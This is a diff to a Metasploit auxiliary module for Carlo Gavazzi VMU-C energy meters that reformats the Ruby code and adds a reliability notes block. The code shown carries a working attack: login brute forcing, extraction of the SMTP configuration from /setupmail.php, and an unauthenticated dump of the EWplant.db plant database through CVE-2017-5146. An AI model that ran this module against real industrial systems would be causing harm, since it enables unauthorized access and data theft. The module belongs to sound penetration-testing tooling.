@@ -9,27 +9,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',
-      'Description' => %{
-        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
-      },
-      'References' =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',
+        'Description' => %q{
+          This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
+        },
+        'References' => [
           ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-012-03'],
           ['CVE', '2017-5146']
         ],
-      'Author' =>
-         [
-           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
-         ],
-      'License' => MSF_LICENSE,
-      'DefaultOptions' =>
-         {
-           'SSL' => false,
-           'VERBOSE' => true
-         }))
+        'Author' => [
+          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
+        ],
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
+          'SSL' => false,
+          'VERBOSE' => true
+        },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -59,8 +65,8 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'uri'       => '/',
-          'method'    => 'GET'
+          'uri' => '/',
+          'method' => 'GET'
         }
       )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
@@ -124,9 +130,9 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'uri'       => '/login.php',
-          'method'    => 'POST',
-          'headers'   => {
+          'uri' => '/login.php',
+          'method' => 'POST',
+          'headers' => {
             'Cookie' => cookie_value
           },
           'vars_post' =>
@@ -137,7 +143,6 @@ class MetasploitModule < Msf::Auxiliary
             }
         }
       )
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
       return :abort
@@ -194,14 +199,13 @@ class MetasploitModule < Msf::Auxiliary
       begin
         res = send_request_cgi(
           {
-            'uri'       => '/setupmail.php',
-            'method'    => 'GET',
-            'headers'   => {
+            'uri' => '/setupmail.php',
+            'method' => 'GET',
+            'headers' => {
               'Cookie' => cookie_value
             }
           }
         )
-
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
         vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
         return :abort
@@ -253,7 +257,7 @@ class MetasploitModule < Msf::Auxiliary
       loot_name = 'EWplant.db'
       loot_type = 'SQLite_db/text'
       loot_desc = 'Carlo Gavazzi EM - EWplant.db'
-      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body , loot_desc)
+      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body, loot_desc)
       print_good("#{rhost}:#{rport} - File saved in: #{path}")
     else
       vprint_error("#{rhost}:#{rport} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?")
